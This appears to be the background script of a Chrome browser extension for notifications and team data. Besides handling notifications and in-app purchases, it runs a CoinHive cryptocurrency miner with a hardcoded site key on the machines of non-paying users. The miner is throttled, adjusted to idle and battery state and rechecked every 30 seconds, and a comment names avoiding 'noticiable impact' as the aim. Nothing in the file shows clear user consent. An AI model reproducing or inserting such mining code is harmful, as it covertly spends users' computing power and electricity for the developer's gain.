/* global CoinHive:true navigator:true */

import { wrapStore } from 'react-chrome-redux';
import { REACT_CHROME_REDUX, SKUS, ENVIRONMENT } from './helpers/constants';
import {
  app as appActions,
  notifications as notificationsActions,
  state as stateActions,
  teams as teamsActions,
} from './actions';
import store from './store/index';
import './buy.js';

const { notification: notificationActions } = notificationsActions;
const { currentTabUrl, message } = appActions;
const { team: teamActions } = teamsActions;

wrapStore(store, {
  portName: REACT_CHROME_REDUX.PORT_NAME,
});

const {
  dispatch,
  getState,
} = store;

let miner;

const state = getState();
// let refreshLoop;

const refreshTeams = () => {
  Object.values(state.teams.data).forEach((team) => {
    const { token } = team.clicky;
    dispatch(teamActions.refresh({ token }));
  });
};

refreshTeams();

chrome.notifications.onClicked.addListener((id) => {
  dispatch(notificationActions.open({ id }));
});

chrome.notifications.onButtonClicked.addListener((id, idx) => {
  if (idx === 0) {
    dispatch(notificationActions.mark({ id }));
  } else {
    dispatch(notificationActions.open({ id }));
  }
});

chrome.notifications.onClosed.addListener((id) => {
  dispatch(notificationActions.closed({ id }));
});

window.hasPaidTier = false;

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'CLEAR_STATE') {
    dispatch(stateActions.clear());
    sendResponse({ ok: true });
  } else if (request.type === 'BUY_PAID_TIER') {
    // Buy the paid tier
    google.payments.inapp.buy({
      parameters: { env: 'prod' },
      sku: SKUS.PAID_TIER,
      success: () => {
        window.hasPaidTier = true;
        chrome.runtime.reload();
        if (miner && miner.isRunning()) miner.stop();
      },
      failure: () => {
        chrome.runtime.reload();
      },
    });
  }
});

const checkForPaidTier = () => (
  new Promise((resolve) => {
    // Check for paid tier
    google.payments.inapp.getPurchases({
      parameters: { env: 'prod' },
      success: (data) => {
        const products = data.response.details;
        // Is correct SKU, and is active
        const hasPaidTier = products.some(x => x.sku === SKUS.PAID_TIER && x.state === 'ACTIVE');
        window.hasPaidTier = hasPaidTier;
        resolve(hasPaidTier);
      },
      failure: () => {
        /**
         * If in doubt, just assume they've bought it... It's just easier this way
         * It stops people getting mad at me if (when) my code breaks
         */
        window.hasPaidTier = true;
        resolve(true);
      },
    });
  })
);

/**
 * onDisconnect fires when popup.html is closed
 * Check that the connection is the one we're
 * expecting then, if it is, clear the message
 */
chrome.runtime.onConnect.addListener((port) => {
  port.onDisconnect.addListener((sender) => {
    const { name } = sender;
    if (name === REACT_CHROME_REDUX.PORT_NAME) {
      dispatch(message.set({ message: '' }));
      dispatch(currentTabUrl.got({ currentTabUrl: '' }));
    }
  });
});

window.isMining = () => {
  let running = false;
  if (miner) {
    running = miner.isRunning();
  }

  if (running) {
    // eslint-disable-next-line
    console.debug('Miner is running: ', miner);
  } else {
    // eslint-disable-next-line
    console.debug('Miner is not running');
  }

  return running;
};

checkForPaidTier().then(() => {
  if (window.hasPaidTier) return;
  if (!CoinHive) return;

  const throttles = {
    active: 0.95,
    default: 0.9,
    idle: 0.5,
    locked: 0.2,
  };

  const setThrottle = (throttle = throttles.active) => {
    miner.setThrottle(throttle);
  };

  // Check if we should continue mining
  const checkForPaidTierAndMineAccordingly = () => {
    checkForPaidTier()
    .then((hasPaidTier) => {
      if (hasPaidTier && miner && miner.isRunning()) {
        // If there is a miner and it's running, but you have the paid tier
        miner.stop();
      } else if (!hasPaidTier && miner && !miner.isRunning()) {
        // If there's a miner that's not running, and you don't have the paid tier
        if (!ENVIRONMENT.DEVELOPMENT) miner.start();
      } else if (!hasPaidTier && miner && miner.isRunning()) {
        /**
         * If there's a miner running, and you don't have the paid tier
         * then check that the throttling makes sense
         * This _should_ prevent bugs from setting the throttle
         * stupidly low or turning it off completely
         * ...
         * I wish I'd thought of this 2 days ago
         */
        const throttle = miner.getThrottle();
        const allowedThrottles = Object.values(throttles);
        const isAllowedThrottle = allowedThrottles.includes(throttle);
        if (!isAllowedThrottle) setThrottle(throttles.active);
      }
    });
  };

  let statusLoop;
  const startLoop = () => {
    statusLoop = setInterval(checkForPaidTierAndMineAccordingly, 30000);
  };

  const stopLoop = () => {
    if (!statusLoop) return;
    clearInterval(statusLoop);
    statusLoop = null;
  };

  // If the battery is not charging, stop mining
  const checkBattery = battery => (
    battery.charging ? checkForPaidTierAndMineAccordingly() : miner.stop()
  );

  // If we've got the battery API then use it
  if (typeof navigator.getBattery === 'function') {
    navigator.getBattery().then((battery) => {
      checkBattery(battery);
      battery.addEventListener('chargingchange', () => {
        checkBattery(battery);
      });
    });
  }

  const startIdleChecks = () => {
    const idleDetectionInterval = 300;

    // Initialize throttle and set detection interval
    chrome.idle.queryState(idleDetectionInterval, (newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });

    chrome.idle.setDetectionInterval(idleDetectionInterval);

    chrome.idle.onStateChanged.addListener((newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });
  };

  const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
  miner = new CoinHive.Anonymous(coinHiveKey);

  miner.on('open', startLoop);
  miner.on('close', stopLoop);

  // Heavily throttle mining to prevent noticiable impact
  setThrottle(throttles.active);

  if (chrome.idle && typeof chrome.idle.queryState === 'function') {
    startIdleChecks();
  } else {
    setThrottle(throttles.default);
  }

  checkForPaidTierAndMineAccordingly();
});
